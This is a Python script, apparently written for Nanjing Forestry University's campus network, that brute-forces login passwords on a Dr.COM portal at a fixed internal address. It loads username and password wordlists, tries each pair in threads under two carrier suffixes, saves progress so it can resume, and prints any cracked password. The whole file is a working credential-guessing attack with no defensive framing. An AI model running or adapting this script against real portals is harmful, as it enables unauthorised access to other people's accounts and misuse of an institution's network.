import time
import requests
import threading
import json
import os
import logging as log
import processbar

MAXTHREADNUM = 1  # 线程数量
correct_password = None  # 用于线程储存正确pwd

log.basicConfig(
    level=log.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    filemode="a",
    filename="log.txt",
)


def banner():
    # banner!!!
    print("\033[1;35mNJFU-get-network-password\nauthored by:\033[0m")

    # black把这里搞得一团糟...
    # 现在好多了
    banner_str = """
\033[1;31m    _____  __     __   ______   __     __  \033[0m         \033[1;34m _______   ________   \033[0m
\033[1;31m   |     \|  \   |  \ /      \ |  \   |  \ \033[0m         \033[1;34m|       \ |        \  \033[0m
\033[1;31m    \$$$$$| $$   | $$|  $$$$$$\| $$   | $$ \033[0m         \033[1;34m| $$$$$$$\| $$$$$$$$  \033[0m
\033[1;31m      | $$| $$   | $$| $$__| $$| $$   | $$ \033[0m         \033[1;34m| $$__| $$| $$__      \033[0m
\033[1;31m __   | $$ \$$\ /  $$| $$    $$ \$$\ /  $$ \033[0m         \033[1;34m| $$    $$| $$  \     \033[0m
\033[1;31m|  \  | $$  \$$\  $$ | $$$$$$$$  \$$\  $$  \033[0m         \033[1;34m| $$$$$$$\| $$$$$     \033[0m
\033[1;31m| $$__| $$   \$$ $$  | $$  | $$   \$$ $$   \033[0m ______  \033[1;34m| $$  | $$| $$_____   \033[0m
\033[1;31m \$$    $$    \$$$   | $$  | $$    \$$$    \033[0m|      \ \033[1;34m| $$  | $$| $$     \  \033[0m
\033[1;31m  \$$$$$$      \$     \$$   \$$     \$     \033[0m \$$$$$$ \033[1;34m \$$   \$$ \$$$$$$$$  \033[0m"""

    print(banner_str)
    print(
        "\n----------------------------------start----------------------------------\n"
    )


def test(usrname, password, plm):
    # 测试pwd是否正确
    url = "http://10.51.2.20/drcom/login"

    params = {
        "callback": "dr1003",
        "login_method": "1",
        "user_account": ",0," + usrname + "@" + plm,
        "user_password": password,
        "wlan_user_ip": "",
        "wlan_user_ipv6": "",
        "wlan_user_mac": "",
        "wlan_ac_ip": "",
        "wlan_ac_name": "",
        "jsVersion": "4.2.2",
        "terminal_type": "1",
        "lang": "zh-cn",
        "v": "0083",
        "lang": "zh",
    }

    result = requests.get(url, params=params)

    if result.status_code == 200:  # 测试连接是否正确
        if '"result":1' in result.text:  # 返回值为true
            return True
        else:
            return False
    else:
        raise requests.exceptions.ConnectionError(result.status_code)


def thread_func(usrname, password):
    global MAXTHREADNUM, correct_password
    MAXTHREADNUM -= 1

    while True:
        try:
            result = test(usrname, password, "cmcc") or test(usrname, password, "njxy")

            if correct_password:  # 如果正确pwd已经存在，则不再执行
                break

            if result:
                correct_password = password
            else:
                log.debug(f"{(usrname, password)}登录失败")

            break

        except requests.exceptions.ConnectionError:
            log.debug(f"{(usrname, password)}连接失败")

        except Exception as e:
            log.error(f"Unknown expection, current: {(usrname, password)}")
            log.exception(e)

    MAXTHREADNUM += 1


banner()  # banner!!!!

# 检查result文件是否存在
if os.path.exists("result.json"):
    results = json.load(open("result.json", "r"))
    current_username = results["current_username"]
    current_password = results["current_password"]
else:  # 使用默认内容
    results = {"current_username": 0, "current_password": 0}
    current_username = 0
    current_password = 0

# 读取处理用户名
with open("username.txt", "r") as f:
    username_list = f.readlines()
username_list = [username.strip() for username in username_list]
print(f"加载用户名数量: {len(username_list)}")
username_list = username_list[current_username:]

# 读取处理密码
with open("password.txt", "r") as f:
    password_list = f.readlines()
password_list = [password.strip() for password in password_list]
print(f"加载密码条数: {len(password_list)}")
password_list = password_list[current_password:]

print(f"当前启用线程数量: {MAXTHREADNUM}")

for username in username_list:

    bar = processbar.ProgressBar(
        total=len(password_list), info="正在爆破账号 " + str(username) + " "
    )

    couter = current_password  # 记录当前密码索引
    for password in password_list:
        while MAXTHREADNUM <= 0:  # 如果线程数量已满, 则等待
            pass

        threading.Thread(target=thread_func, args=(username, password)).start()
        bar.work(1)

        couter += 1
        if couter % 64 == 0:  # 当密码索引达到64记录当前密码索引
            results["current_password"] = couter
            json.dump(results, open("result.json", "w"))

        if correct_password:  # 如果正确pwd已经存在, 则退出循环
            break

    if correct_password:
        print(f"\n\033[1;32m{username} 的密码为 {correct_password}\033[0m")
    else:
        print(
            f"\n\033[1;31m没有得到 {username} 的密码，可能密码字典不包含或用户不存在\033[0m"
        )

    print("记录结果，5秒后开始爆破下个用户名")
    time.sleep(5)

    # 处理, 重置参数
    results[username] = correct_password
    results["current_username"] += 1
    results["current_password"] = 0
    correct_password = None
    current_password = 0
    json.dump(results, open("result.json", "w"))
